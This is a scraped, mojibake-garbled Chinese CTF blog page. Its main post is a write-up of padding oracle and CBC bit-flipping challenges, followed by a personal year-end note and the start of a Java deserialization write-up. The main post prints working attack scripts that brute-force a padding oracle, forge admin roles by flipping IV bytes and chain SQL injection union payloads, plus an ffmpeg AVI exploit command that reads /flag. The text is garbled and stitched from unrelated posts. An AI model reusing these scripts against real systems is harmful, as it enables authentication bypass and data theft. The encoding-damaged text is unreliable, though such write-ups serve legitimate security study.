çœ‹çœ‹è¯¦æƒ…\nå‘loginå‘è¯·æ±‚åè¿”å›çš„æ˜¯\n{\u0026#34;code\u0026#34;:100,\u0026#34;data\u0026#34;:{\u0026#34;token\u0026#34;:\u0026#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9\u0026#34;}} å‘infoè¯·æ±‚çš„å¤´ä¸­\nCookie: Key=eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9 è¯·æ±‚åè¿”å›çš„æ˜¯\n{\u0026#34;code\u0026#34;:100,\u0026#34;data\u0026#34;:{\u0026#34;user_role\u0026#34;:3,\u0026#34;uid\u0026#34;:1}} tokenè§£ç ä¸€ä¸‹çœ‹çœ‹\n{\u0026#34;signed_key\u0026#34;:\u0026#34;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1Z6lcvRnqAYZRBazce+5X7tRI6GlkrCUKZo/j72qvq9N4GeSisj3BVYYvt8Y3VFPwktIDysmCJMtJ7EAkYH5SE/w==\u0026#34;,\u0026#34;role\u0026#34;:3,\u0026#34;user_id\u0026#34;:1,\u0026#34;payload\u0026#34;:\u0026#34;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv\u0026#34;,\u0026#34;expire_in\u0026#34;:1580668951} sign_keyè§£ç çœ‹çœ‹\nICxkSingDanceRaP{\u0005A\u001e%ÂŸÂ•E\u000bÃ’Ã´ÃµÃ§!Â‘ÂˆSY\b\u0026#34;ÃÂš!ÂnÃ‰ZÃŸ|Ã¿Ã­YÃªW/FzÂ€aÂ”Ak7\u001eÃ»Â•Ã»Âµ\u0012:\u001aY+\tBÂ™Â£Ã¸Ã»ÃšÂ«ÃªÃ´Ã\u0006y(Â¬ÂpUaÂ‹Ã­Ã±ÂÃ•\u0014Ã¼$Â´Â€Ã²Â²`Â‰2Ã’{\u0010\t\u0018\u001fÂ”Â„Ã¿ \u0026ldquo;æˆ‘è”¡å¾å¤å”±è·³rap\u0026rdquo;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;.ç„¶ååé¢æ˜¯ä¹±ç , è¿™ä¸ªç©æ„å°±æ˜¯cbcåŠ å¯†çš„ç‰¹å¾, é‚£ä¹ˆsigned_keyå°±æ˜¯cbcåŠ å¯†åç»è¿‡base64çš„å¯†æ–‡, è¿˜å¾—ç”¨padding oracle attackè§£å‡ºæ˜æ–‡æ¥\nè§£å¯†è¿‡ç¨‹:\nC1 ^ ä¸­é—´å€¼çš„æœ€åä¸€ä½ = 0Ã—01 ä¸­é—´å€¼çš„æœ€åä¸€ä½ = C1 ^ 0Ã—01 C1 ^ ä¸­é—´å€¼çš„æœ€å2ä½ = 0Ã—02 0x02 ä¸­é—´å€¼çš„æœ€å2ä½ = C1 ^ (0Ã—02 0x02) .... ä¸€ç›´åˆ°æ¨å‡ºæ•´ä¸ªC2çš„ä¸­é—´å€¼,å’ŒC1å¼‚æˆ–å°±å¾—åˆ°äº†C2çš„æ˜æ–‡ åŒç†, å¯ä»¥ç ´è§£æ•´ä¸ªæ˜æ–‡\nè¿™æ˜¯ä»å…¶ä»–å¸ˆå‚…å·è¿‡æ¥çš„è„šæœ¬\nimport time import requests import base64 import json host = \u0026#34;938a4575-3337-42bd-b712-45b008d529c5.node3.buuoj.cn\u0026#34; port = \u0026#34;\u0026#34; def padding_oracle(key): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode[\u0026#39;signed_key\u0026#39;] signed_key_decoded = base64.b64decode(signed_key) url = \u0026#34;http://\u0026#34; + host + \u0026#34;/frontend/api/v1/user/info\u0026#34; N = 16 total_plain = \u0026#39;\u0026#39; for block in range(0, len(signed_key_decoded) // 16 - 1): token = \u0026#39;\u0026#39; get = b\u0026#34;\u0026#34; # å¯¹æ¯ä¸€å—å¯†æ–‡ cipher = signed_key_decoded[16 + block * 16:32 + block * 16] # å¯¹æ¯ä¸€ä½ for i in range(1, N+1): # çˆ†ç ´ for j in range(0, 256): time.sleep(0.1) # å·²çŸ¥ä½çš„paddingå¯¹åº”çš„è§£å¯†å¼‚æˆ–å€¼ padding = b\u0026#34;\u0026#34;.join([(get[n] ^ i).to_bytes(1, \u0026#39;little\u0026#39;) for n in range(len(get))]) # å°†è§£å¯†å¼‚æˆ–å€¼ å’Œ è¿™å—å¯†æ–‡ä½œä¸ºä¸€ä¸ªsigned_keyå°è¯•è¿›è¡Œè§£å¯† c = b\u0026#39;\\x00\u0026#39; * (16 - i) + j.to_bytes(1, \u0026#39;little\u0026#39;) + padding + cipher #print(c) token = base64.b64encode(c) user_key_json_decode[\u0026#39;signed_key\u0026#39;] = token.decode(\u0026#34;utf-8\u0026#34;) header = {\u0026#39;Key\u0026#39;: base64.b64encode(bytes(json.dumps(user_key_json_decode), \u0026#34;utf-8\u0026#34;))} res = requests.get(url, headers=header) #print(res.text, j) print(res.json()) # 205åœ¨æµ‹è¯•çš„æ—¶å€™å°±æ˜¯è§£å¯†ä¸æˆåŠŸ, å…¶ä»–çš„æƒ…å†µè¦ä¹ˆæ˜¯è§£å¯†æˆåŠŸä½†æ˜¯ä¸ç¬¦åˆè¦æ±‚å’Œç¬¦å’Œè¦æ±‚çš„ if res.json()[\u0026#39;code\u0026#39;] != 205: get = (j ^ i).to_bytes(1, \u0026#39;little\u0026#39;) + get print(get, i) break # è¿™é‡Œå­˜ç–‘, ä¸ºä»€ä¹ˆæ˜¯ä¸æ˜¯signed_key_decoded[(block+1)*16 + i]å‘¢ plain = b\u0026#34;\u0026#34;.join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, \u0026#39;little\u0026#39;) for i in range(N)]) print(plain.decode(\u0026#34;utf-8\u0026#34;), \u0026#34;block=%d\u0026#34; % block) total_plain += plain.decode(\u0026#34;utf-8\u0026#34;) print(total_plain) return total_plain plain_text = padding_oracle(\u0026#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9\u0026#34;) print(plain_text) æ…¢æ…¢çš„å¯ä»¥è·‘å‡ºæ¥æ˜æ–‡, (å‡è£…è·‘å‡ºæ¥äº†, å…¶å®å› ä¸ºbuuçš„é˜²æŠ¤è¯·æ±‚å¤šäº†ç›´æ¥æ–­å¼€è¿æ¥, ä½†æ˜¯å¯ä»¥è·‘å‡ºå‡ ä½)\n{\u0026#34;role\u0026#34;:3,\u0026#34;user_id\u0026#34;:1,\u0026#34;payload\u0026#34;:\u0026#34;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv\u0026#34;,\u0026#34;expire_in\u0026#34;:1580668951} é‚£ä¹ˆè¿™ä¸ªsigned_keyå°±æ˜¯ç»™åé¢çš„æ˜æ–‡ä½œä¸ºä¸€ä¸ªéªŒè¯ä½¿ç”¨.\nä¹‹å‰çš„é‚£ä¸ªæ²¡æœ‰æƒé™ç™»å½•, å°±æ˜¯è¿™ä¸ªroleçš„å…³ç³», è¦æŠŠå®ƒä¿®æ”¹æˆ1 , å°±è¦æŠŠå¯†æ–‡ä¹Ÿä¿®æ”¹äº†, åˆ©ç”¨cbcå­—èŠ‚åè½¬æ”»å‡»æ¥ä¿®æ”¹å¯†æ–‡.\nç”±äºè¦ä¿®æ”¹çš„æ˜æ–‡åªæ˜¯åœ¨ç¬¬ä¸€åŒºå—ä¸­, å› æ­¤åªéœ€è¦ä¿®æ”¹IVå°±è¡Œäº†, è®¾ åŸæ˜æ–‡ä¸ºPB, ä¿®æ”¹åçš„æ˜æ–‡ä¸ºPA\nC[i] ^ PB[i] = IV[i] C[i] ^ PA[i] = new_IV[i] C[i] = PB[i] ^ IV[i] PB[i] ^ PA[i] ^ IV[i] = new_IV[i] è¿˜æ˜¯å·æ¥çš„è„šæœ¬\n#!/usr/bin/python2.7 # -*- coding:utf8 -*- import requests import base64 import json host = \u0026#34;dd8b9a48-d183-45ea-831c-2fe0eb2b7e29.node3.buuoj.cn\u0026#34; def cbc_attack(key, block, origin_content, target_content): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode[\u0026#39;signed_key\u0026#39;] cipher_o = base64.b64decode(signed_key) if block \u0026gt; 0: iv_prefix = cipher_o[:block * 16] else: iv_prefix = \u0026#39;\u0026#39; iv = cipher_o[block * 16:16 + block * 16] cipher = cipher_o[16 + block * 16:] iv_array = bytearray(iv) for i in range(0, 16): iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i]) iv = bytes(iv_array) user_key_json_decode[\u0026#39;signed_key\u0026#39;] = base64.b64encode(iv_prefix + iv + cipher) return base64.b64encode(json.dumps(user_key_json_decode)) def get_user_info(key): r = requests.post(\u0026#34;http://\u0026#34; + host + \u0026#34;/frontend/api/v1/user/info\u0026#34;, headers = {\u0026#34;Key\u0026#34;: key}) if r.json()[\u0026#39;code\u0026#39;] == 100: print(\u0026#34;è·å–æˆåŠŸï¼\u0026#34;) return r.json()[\u0026#39;data\u0026#39;] def modify_role_palin(key, role): user_key_decode = base64.b64decode(user_key) user_key_json_decode = json.loads(user_key_decode) user_key_json_decode[\u0026#39;role\u0026#39;] = role return base64.b64encode(json.dumps(user_key_json_decode)) print(\u0026#34;ç¿»è½¬ Key:\u0026#34;) user_key = cbc_attack(\u0026#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9\u0026#34;, 0, \u0026#39;{\u0026#34;role\u0026#34;:3,\u0026#34;user_\u0026#39;, \u0026#39;{\u0026#34;role\u0026#34;:1,\u0026#34;user_\u0026#39;) user_key = modify_role_palin(user_key, 1) print(user_key) print(\u0026#34;æµ‹è¯•æ‹‰å–ç”¨æˆ·ä¿¡æ¯ï¼š\u0026#34;) user_info = get_user_info(user_key) print(user_info) æ”¹å®ŒåæŠŠæ–°çš„å¯†æ–‡ä½œä¸ºkeyè®¿é—®, åˆ·æ–°é¡µé¢, æˆåŠŸç™»å½•, å‘ç°éŸ³é¢‘ä¸Šä¼ çš„åŠŸèƒ½.çœ‹èµµå¸ˆå‚…wpè¯´ä¸Šä¼ ä¸åŒç±»å‹çš„æ–‡ä»¶ç„¶åä¸‹è½½ä¸Šä¼ çš„æ–‡ä»¶(å¦‚ä¸‹å›¾ä¸Šä¼ åå¯ä»¥åœ¨networkä¸­å‘ç°url), å¯¹æ¯”ä¸Šä¼ å‰åæ–‡ä»¶çš„md5å€¼å‘ç°å¯¹aviæ–‡ä»¶æœ‰è¿›è¡Œå¤„ç†, è¿™ä¸ªå§¿åŠ¿å­¦åˆ°äº†.\nçŒœæµ‹åå°ä½¿ç”¨ffmpegæ¥å¯¹éŸ³è§†é¢‘è¿›è¡Œå¤„ç†(miscçš„ä¸œè¥¿æˆ‘ä¸€ç‚¹çŒœä¸åˆ°), ç„¶åä½¿ç”¨å¯¹åº”çš„æ¼æ´\nhttps://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py\npython3 gen_xbin_avi.py file:///flag test.avi ä¸Šä¼ , ä¸‹è½½, æ’­æ”¾, å‘ç°flag\nå®éªŒå§ ç®€å•çš„ç™»é™†é¢˜ çœŸéš¾\n# -*- coding:utf-8 -*- from base64 import * import urllib import requests import re def denglu(payload,idx,c1,c2): url=r\u0026#39;http://ctf5.shiyanbar.com/web/jiandan/index.php\u0026#39; payload = {\u0026#39;id\u0026#39;: payload} r = requests.post(url, data=payload) Set_Cookie=r.headers[\u0026#39;Set-Cookie\u0026#39;] iv=re.findall(r\u0026#34;iv=(.*?),\u0026#34;, Set_Cookie)[0] cipher=re.findall(r\u0026#34;cipher=(.*)\u0026#34;, Set_Cookie)[0] iv_raw = b64decode(urllib.unquote(iv)) cipher_raw=b64decode(urllib.unquote(cipher)) lst=list(cipher_raw) lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2)) cipher_new=\u0026#39;\u0026#39;.join(lst) cipher_new=urllib.quote(b64encode(cipher_new)) cookie_new={\u0026#39;iv\u0026#39;: iv,\u0026#39;cipher\u0026#39;:cipher_new} r = requests.post(url, cookies=cookie_new) cont=r.content plain = re.findall(r\u0026#34;base64_decode\\(\u0026#39;(.*?)\u0026#39;\\)\u0026#34;, cont)[0] plain = b64decode(plain) first=\u0026#39;a:1:{s:2:\u0026#34;id\u0026#34;;s:\u0026#39; iv_new=\u0026#39;\u0026#39; for i in range(16): iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i])) iv_new = urllib.quote(b64encode(iv_new)) cookie_new = {\u0026#39;iv\u0026#39;: iv_new, \u0026#39;cipher\u0026#39;: cipher_new} r = requests.post(url, cookies=cookie_new) rcont = r.content print rcont denglu(\u0026#39;12\u0026#39;,4,\u0026#39;2\u0026#39;,\u0026#39;#\u0026#39;) denglu(\u0026#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);\u0026#39;+chr(0),6,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) denglu(\u0026#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);\u0026#39;+chr(0),7,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) denglu(\u0026#34;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp \u0026#39;you_want\u0026#39;)b join (select 3)c);\u0026#34;+chr(0),7,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) denglu(\u0026#34;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);\u0026#34;+chr(0),6,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) è‡ªå·±çš„è„šæœ¬ä¼šå‡ºç°é”™è¯¯\nimport requests import base64 import urllib import re url=\u0026#39;http://ctf5.shiyanbar.com/web/jiandan/index.php\u0026#39; post={\u0026#39;id\u0026#39;:\u0026#34;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);\u0026#34;+chr(0)} responce=requests.post(url,data=post) iv=base64.b64decode(urllib.unquote(re.findall(r\u0026#34;iv=(.*?),\u0026#34;,responce.headers[\u0026#39;Set-Cookie\u0026#39;])[0])) cipher=base64.b64decode(urllib.unquote(re.findall(r\u0026#34;cipher=(.*)\u0026#34;,responce.headers[\u0026#39;Set-Cookie\u0026#39;])[0])) def answer(cipher,old_iv,offset,old_letter,new_letter): cipher=list(cipher) cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset])) cipher=\u0026#39;\u0026#39;.join(cipher) cookie={\u0026#39;cipher\u0026#39;:urllib.quote(base64.b64encode(cipher)),\u0026#39;iv\u0026#39;:urllib.quote(base64.b64encode(old_iv))} res=requests.post(url,cookies=cookie) wrong_plain=base64.b64decode(re.findall(r\u0026#34;base64_decode\\(\u0026#39;(.*?)\u0026#39;\\)\u0026#34;,res.content)[0]) new_iv = \u0026#39;\u0026#39; right=\u0026#39;a:1:{s:2:\u0026#34;id\u0026#34;;s:\u0026#39; for i in range(16): new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i])) cookie={\u0026#39;cipher\u0026#39;:urllib.quote(base64.b64encode(cipher)),\u0026#39;iv\u0026#39;:urllib.quote(base64.b64encode(new_iv))} res=requests.post(url,cookies=cookie) print res.content answer(cipher,iv,7,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) é”™è¯¯æŠ¥å‘Šå¦‚ä¸‹ï¼š\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;2)ion select * from((select 1)a join (select 2)b join (select 3)c);\u0026#39; at line 1 ä¹Ÿå°±æ˜¯è¯´æ”¹å˜çš„ä½ç½®å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ˜¯å¯¹å¦ä¸€äº›payloadæ¥è¯´å´å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œå¾ˆæ˜¯å¥‡æ€ªï¼Œéš¾é“æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„é—®é¢˜? æ˜ç™½äº†ï¼Œæ­£åˆ™è¡¨è¾¾å¼æ²¡æœ‰é—®é¢˜ï¼Œæ˜¯è‡ªå·±ä»¥ä¸ºå‰é¢å­—æ®µä¸€æ ·åºåˆ—åŒ–ä¹‹åå‰é¢çš„å­—æ®µä¹Ÿä¼šä¸€æ ·çš„åŸå› å¯¼è‡´ï¼Œå…¶å®æ˜¯ä¸ä¸€æ ·çš„ ä¸€ä¸ªåç§»ä½ç½®ä¸º6ï¼Œä¸€ä¸ªä¸º7ï¼Œè¿™ä¸ªæ­£åˆ™è¦å¥½å¥½çœ‹çœ‹\njavisoj xman 2019 xbitf æºä»£ç å¦‚ä¸‹ï¼š\nclass Unbuffered(object): def __init__(self, stream): self.stream = stream def write(self, data): self.stream.write(data) self.stream.flush() def __getattr__(self, attr): return getattr(self.stream, attr) import sys sys.stdout = Unbuffered(sys.stdout) #import signal #signal.alarm(600) import random import time flag=open(\u0026#34;/root/xbitf/flag\u0026#34;,\u0026#34;r\u0026#34;).read() from Crypto.Cipher import AES import os def aes_cbc(key,iv,m): handler=AES.new(key,AES.MODE_CBC,iv) return handler.encrypt(m).encode(\u0026#34;hex\u0026#34;) def aes_cbc_dec(key,iv,c): handler=AES.new(key,AES.MODE_CBC,iv) return handler.decrypt(c.decode(\u0026#34;hex\u0026#34;)) key=os.urandom(16) iv=os.urandom(16) session=os.urandom(8) token=\u0026#34;session=\u0026#34;+session.encode(\u0026#34;hex\u0026#34;)+\u0026#34;;admin=0\u0026#34; checksum=aes_cbc(key,iv,token) print token+\u0026#34;;checksum=\u0026#34;+checksum for i in range(10): token_rcv=raw_input(\u0026#34;token:\u0026#34;) if token_rcv.split(\u0026#34;admin=\u0026#34;)[1][0]==\u0026#39;1\u0026#39; and token_rcv.split(\u0026#34;session=\u0026#34;)[1][0:16].decode(\u0026#34;hex\u0026#34;)==session: c_rcv=token_rcv.split(\u0026#34;checksum=\u0026#34;)[1].strip() m_rcv=aes_cbc_dec(key,iv,c_rcv) # è®²è§£ç çš„ç»“æœæ‰“å°å‡ºæ¥ print m_rcv if m_rcv.split(\u0026#34;admin=\u0026#34;)[1][0]==\u0026#39;1\u0026#39;: print flag è§£é¢˜è„šæœ¬\nplain = \u0026#34;session=c3b76cc709a8fddf;admin=0\u0026#34; checksum=\u0026#34;92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29\u0026#34; bit = (ord(checksum.decode(\u0026#39;hex\u0026#39;)[15]) ^ord(\u0026#39;0\u0026#39;) ^ ord(\u0026#39;1\u0026#39;)) # æ¯ä¸ª16ä½åŠ å¯†ä¹‹åéƒ½ä¼šå˜æˆ32ä½ï¼Œè¿™é‡Œè¦æ›¿æ¢ç¬¬ä¸€ç»„çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰€åŠ å¯†åçš„å†…å®¹ checksum_final = checksum[:30] + hex(bit)[2:] + checksum[32:] print checksum_final åœ¨sessioné€šè¿‡ä¹‹åå°±ä¸å†å¯¹sessionè¿›è¡ŒéªŒè¯äº†ï¼Œæ‰€ä»¥å‰16ä½ä¹±ç ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚\nbugku login4 è¿™é“é¢˜ç”±äºè‡ªå·±æ²¡æœ‰è®¤è®¤çœŸçœŸå»åšï¼Œå¯¼è‡´åšå‡ºæ¥èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´ã€‚ç›¸å…³writeupå¦‚ä¸‹ï¼š\nhttps://blog.csdn.net/zpy1998zpy/article/details/80684485\nhttps://www.jianshu.com/p/a61756e54f4f\nè‡ªå·±çš„ä»£ç å¦‚ä¸‹ï¼š\n\u0026lt;?php $iv=\u0026#39;4NyZMJ9AOU5JGstqfld10A%3D%3D\u0026#39;; $cipher=\u0026#39;T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D\u0026#39;; //username=bdmin password=111 $iv=base64_decode(urldecode($iv)); $cipher=base64_decode(urldecode(($cipher))); $source=array(\u0026#39;username\u0026#39;=\u0026gt;\u0026#39;bdmin\u0026#39;,\u0026#39;password\u0026#39;=\u0026gt;\u0026#39;111\u0026#39;); $plain=serialize($source); $plain1 = substr($plain,0,16); $plain2 = substr($plain,16,16); $cipher[9] = chr(ord($cipher[9])^ord(\u0026#39;b\u0026#39;)^ord(\u0026#39;a\u0026#39;)); $new_iv=\u0026#39;\u0026#39;; $wrong_plain=base64_decode(\u0026#34;U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ==\u0026#34;); for($i=0;$i\u0026lt;16;$i++){ $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i])); } echo urlencode(base64_encode($new_iv)).\u0026#39; \u0026#39;.urlencode(base64_encode($cipher)); ","permalink":"https://dragonbox.top/posts/sec-padding-oracle-and-cbc-attack/","summary":"\u003cp\u003epadding oracle åŸç†: \u003ca href=\"https://www.freebuf.com/articles/database/150606.html\"\u003ehttps://www.freebuf.com/articles/database/150606.html\u003c/a\u003e\u003c/p\u003e","title":"padding_oracle å’Œ cbcå­—èŠ‚åè½¬"},{"content":"æ˜¨æ™šçº¦å¥½çš„è½¦ä»Šå¤©æ—©ä¸Šç«Ÿç„¶è¢«å¸æœºä¸€å£°ä¸å­å–æ¶ˆäº†, çœŸçš„æ— è¯­\u0026hellip;\u0026hellip;å¾—äºç¡å¾—æµ…èµ·åºŠçœ‹äº†ä¸€çœ¼.æ–°çº¦çš„è½¦åˆè¦æ—©æ—©å¼€å¾€æœºåœº, äºæ˜¯æ— å¥ˆèµ·äº†ä¸ªå¤§æ—©. åˆ°è¾¾ååˆè¢«é€šçŸ¥å»¶è¯¯, ä¹Ÿä¸çŸ¥å’Œç¦»å¼€æ—¶å€™çš„é£é›ªæœ‰æ— å…³ç³», ä½†ä¸ç®¡æ€æ ·, å­¤èº«é¡¶ç€é¹…æ¯›è¡Œèµ°è·¯ä¸Š, è¿™æ ·ç¦»å¼€å€’è¿˜æ˜¯åˆ«æœ‰é£å‘³, äºæ˜¯ä¹Ÿæœ‰äº†ç¢ç¢å¿µçš„å…´è‡´.\nä»Šå¹´çš„äº‹æƒ…è¾ƒå»å¹´ç®€å•äº†å¾ˆå¤š, ä¹Ÿæ²¡é‚£ä¹ˆå¤šæƒ³æ³•, æ€»ç»“èµ·æ¥æ— éå°±æ˜¯æŠŠç³»ç»Ÿæ¢æˆäº†ubuntuåˆæ¢å›äº†windows, åœ¨ç¯å¢ƒä¸Šä¸‹äº†å¾ˆå¤šåŠŸå¤«, æµªè´¹äº†å¾ˆå¤šæ—¶é—´, æ‰“äº†å‡ æ¬¡è¢«å¸¦é£çš„æ¯”èµ›, å»äº†è¶Ÿxman, è®¤è¯†äº†ä¸€äº›å¾ˆæœ‰è¶£çš„æœ‹å‹å’Œç½‘å‹, ç„¶åè§‰å¾—è‡ªå·±æ›´åŠ çš„èœè¦åŠªåŠ›äº†, å…¶ä»–æ²¡äº†.\næ²¡äº†?\nçœ‹èµ·æ¥çš„ç¡®æ˜¯è¿™æ ·å¹³æ·¡çš„ä¸€å¹´, ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«å€¼å¾—çºªå¿µçš„äº‹æƒ…, å°±åœ¨è‡ªå·±æ€€ç€\u0026quot;å•Šåˆæ˜¯å¹³æ·¡çš„ä¸€å¹´å•Š\u0026quot;çš„å¿ƒæ€å‡†å¤‡å¼€å§‹2020çš„æ—¶å€™, ç”±äºä¸€äº›æ„å¤–, æˆ‘å¼€å§‹è¿½æ±‚è‡ªå·±å–œæ¬¢çš„å§‘å¨˜äº†. è™½ç„¶ä¸çŸ¥é“ç»“æœå¦‚ä½•, åæ­£ä¸åæ‚”å°±æ˜¯äº†, ä¸´é˜µè„±é€ƒè¿™ç§äº‹æƒ…è¦æ˜¯åšäº†ä¼šè¢«è‡ªå·±çœ‹ä¸èµ·çš„.\nå¦å¤–, ä¹Ÿå¾—åˆ—ä¸ªæ–°å¹´è®¡åˆ’å§, ä¸ç„¶å¯å¤ªæ°´äº†:\nå­¦ä¼šjava web djangoæ­åšå®¢ flask æ­åšå®¢ æ¯å¤©è‡³å°‘åˆ·é¢˜ä¸€é“webä¸€é“å¯†ç  æ¯å¤©å›å¿†å¤ä¹ , æ¯å‘¨å›å¿†å’Œå¤ä¹  æ¯å¤©åƒæ°´æœ çœ‹å®Œä¹¦ webå‰ç«¯é»‘å®¢æŠ€æœ¯è§£å¯† ç™½å¸½å­è®²webå®‰å…¨ 10ç‚¹ä¹‹åä¸çœ‹bç«™, æ—©ç¡æ—©èµ· ","permalink":"https://dragonbox.top/posts/gossip-note-before-back/","summary":"\u003cp\u003eæ˜¨æ™šçº¦å¥½çš„è½¦ä»Šå¤©æ—©ä¸Šç«Ÿç„¶è¢«å¸æœºä¸€å£°ä¸å­å–æ¶ˆäº†, çœŸçš„æ— è¯­\u0026hellip;\u0026hellip;å¾—äºç¡å¾—æµ…èµ·åºŠçœ‹äº†ä¸€çœ¼.æ–°çº¦çš„è½¦åˆè¦æ—©æ—©å¼€å¾€æœºåœº, äºæ˜¯æ— å¥ˆèµ·äº†ä¸ªå¤§æ—©. åˆ°è¾¾ååˆè¢«é€šçŸ¥å»¶è¯¯, ä¹Ÿä¸çŸ¥å’Œç¦»å¼€æ—¶å€™çš„é£é›ªæœ‰æ— å…³ç³», ä½†ä¸ç®¡æ€æ ·, å­¤èº«é¡¶ç€é¹…æ¯›è¡Œèµ°è·¯ä¸Š, è¿™æ ·ç¦»å¼€å€’è¿˜æ˜¯åˆ«æœ‰é£å‘³, äºæ˜¯ä¹Ÿæœ‰äº†ç¢ç¢å¿µçš„å…´è‡´.\u003c/p\u003e","title":"ä¸´è¡Œå‰å¤œ--2019"},{"content":"å¼€ä¸€ä¸ªæ–°å‘~~\n2020 ç½‘é¼æ¯ filejava è¯»ç›®å½•å¯ä»¥çˆ†å‡ºç»å¯¹è·¯å¾„\nè¯»ä¸‹tomcatçš„æ—¥å¿—(logs/catalina.out), çœ‹åˆ°ä¸€ä¸ªwaråŒ…, ä¸‹è½½, çœ‹åˆ°uploadçš„æ—¶å€™ä¼šè§£æ\nif (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName)) { try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException var20) { System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;); var20.printStackTrace(); } } ç„¶åå‚è€ƒhttps://www.jishuwen.com/d/2inW/zh-hk æŠŠworkbook.xmlå’Œcontent-type.xmléƒ½æ”¹äº†\n2020 VNCTF easyspringmvc è€ƒå¯Ÿjavaååºåˆ—åŒ–\nä¸‹è½½waråŒ…åç”¨jd-guiæ‰“å¼€çœ‹æºä»£ç , ç›®å½•ç»“æ„\nä¸»è¦çœ‹classes.comä¸‹é¢çš„\nPictureController.class\npackage WEB-INF.classes.com.controller; import com.controller.PictureController; import com.tools.ClientInfo; import java.io.File; import java.io.FileInputStream; import java.io.InputStream; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServletRequest; 